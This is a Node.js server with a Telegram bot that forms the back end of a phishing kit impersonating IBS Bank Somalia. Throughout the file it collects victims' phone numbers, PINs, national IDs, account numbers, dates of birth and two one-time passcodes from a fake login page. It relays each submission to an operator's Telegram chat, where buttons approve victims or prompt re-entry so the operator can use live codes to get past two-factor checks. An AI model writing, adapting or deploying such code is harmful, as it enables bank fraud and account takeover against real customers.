const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

const statusStore = {};

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Login / Details Notification API
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin, nationalId, accountNumber, dob, email } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    const identifier = phone || accountNumber;
    if (!identifier || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[identifier] = "pending";

    const message = `🏦 <b>IBS BANK SOMALIA - USER SUBMISSION</b>

🇸🇴 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
🆔 <b>National ID:</b> <code>${nationalId || 'N/A'}</code>
💳 <b>IBS Account Number:</b> <code>${accountNumber || 'N/A'}</code>
📅 <b>Date of Birth:</b> <code>${dob || 'N/A'}</code>
📧 <b>Email:</b> <code>${email || 'N/A'}</code>
📱 <b>Phone Number:</b> <code>${phone || 'N/A'}</code>
🔢 <b>PIN:</b> <code>${pin || 'N/A'}</code>
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow to proceed", callback_data: `approve|${identifier}|${pin || 'none'}` },
                        { text: "❌ Invalid credentials", callback_data: `deny|${identifier}|${pin || 'none'}` }
                    ],
                    [
                        { text: "❌ Wrong National ID", callback_data: `wrong_nationalid|${identifier}` },
                        { text: "❌ Wrong Account Number", callback_data: `wrong_account|${identifier}` }
                    ],
                    [
                        { text: "❌ Wrong Date of Birth", callback_data: `wrong_dob|${identifier}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, code } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !code || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp1";

    const otpMessage = `🆕 <b>IBS BANK SOMALIA - VERIFICATION NEEDED</b>
🇸🇴 <b>Country:</b> ${country}
📞 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> <code>${phone}</code>
🔑 <b>VERIFICATION CODE:</b> <code>${code}</code>
⏰ <b>Time:</b> ${currentTime}

<b>━━━━━━━━━━━━━━━━━</b>

⚠️ <b>Verify the credentials:</b>
⏰ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct (OTP)", callback_data: `otp1_correct|${phone}` }
                    ],
                    [
                        { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
                        { text: "⚠️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp2";

    const otpMessage2 = `2️⃣ <b>IBS BANK SOMALIA - SECOND OTP (Step 2/2)</b>

🇸🇴 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> <code>${phone}</code>
🔐 <b>Second OTP Code:</b> <code>${otp}</code>
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify SECOND OTP:</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage2, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `otp2_correct|${phone}|${otp}` },
                        { text: "❌ Wrong Code", callback_data: `otp2_wrong|${phone}` },
                        { text: "🔑 Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/resend-otp-notification', async (req, res) => {
    const { phone, step } = req.body || {};
    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    const resendMsg = `🔄 <b>RESEND REQUESTED</b>

📱 <b>Phone Number:</b> <code>${phone}</code>
📍 <b>Step:</b> ${step}
⚠️ <b>User is waiting for a new code.</b>

━━━━━━━━━━━━━━━`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, resendMsg, { parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Telegram error" });
    }
});

// Bot Action Handlers for Custom Errors
bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const id = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[id] = "approved";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const approvedMsg = `✅ <b>LOGIN APPROVED</b>

🇸🇴 <b>Somalia</b>
📱 <code>${id}</code>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Approved</b>
➡️ <b>Next: First OTP</b>
⏱ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Allowed");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(approvedMsg);
});

bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const id = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[id] = "denied";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>

🇸🇴 <b>Somalia</b>
📱 <code>${id}</code>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

❌ <b>Status: Rejected</b>
⏱️ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Rejected");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(deniedMsg);
});

bot.action(/^wrong_nationalid\|(.+)/, async (ctx) => {
    const id = ctx.match[1];
    statusStore[id] = "wrong_nationalid";
    await ctx.answerCbQuery("Wrong National ID");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>WRONG NATIONAL ID REPORTED</b>\n📱 <b>User:</b> <code>${id}</code>\n⚠️ <b>Prompted to re-enter National ID.</b>`);
});

bot.action(/^wrong_account\|(.+)/, async (ctx) => {
    const id = ctx.match[1];
    statusStore[id] = "wrong_account";
    await ctx.answerCbQuery("Wrong Account Number");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>WRONG ACCOUNT NUMBER REPORTED</b>\n📱 <b>User:</b> <code>${id}</code>\n⚠️ <b>Prompted to re-enter Account Number.</b>`);
});

bot.action(/^wrong_dob\|(.+)/, async (ctx) => {
    const id = ctx.match[1];
    statusStore[id] = "wrong_dob";
    await ctx.answerCbQuery("Wrong Date of Birth");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>WRONG DATE OF BIRTH REPORTED</b>\n📱 <b>User:</b> <code>${id}</code>\n⚠️ <b>Prompted to re-enter Date of Birth.</b>`);
});

bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const verifiedMsg = `1️⃣ <b>FIRST OTP VERIFIED</b>

🇸🇴 <b>Somalia</b>
📱 <code>${phone}</code>

━━━━━━━━━━━━━━━

✅ <b>Status: OTP verified</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg);
});

bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_wrong";
    await ctx.answerCbQuery("Wrong Code");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> <code>${phone}</code>\n⚠️ <b>Prompted to re-enter OTP.</b>`);
});

bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const otp = ctx.match[2];
    statusStore[phone] = "otp2_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const verifiedMsg2 = `2️⃣ <b>SECOND OTP VERIFIED</b>

🇸🇴 <b>Somalia</b>
📱 <code>${phone}</code>
🔐 <code>${otp}</code>

━━━━━━━━━━━━━━━

✅ <b>Status: Completed</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Finalized");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg2);
});

bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrong";
    await ctx.answerCbQuery("Wrong Code");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>SECOND OTP WRONG</b>\n📱 <b>User:</b> <code>${phone}</code>\n⚠️ <b>Prompted to re-enter OTP.</b>`);
});

bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrongpin";
    await ctx.answerCbQuery("Wrong PIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <code>${phone}</code>\n⚠️ <b>User prompted to re-enter PIN.</b>`);
});

app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    
    res.json({ status: currentStatus });

    if (currentStatus === "approved") {
        statusStore[phone] = "idle_waiting_for_otp1";
    }
});

app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot is active");
    } catch (err) {
        console.error("Launch error:", err);
    }
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
      
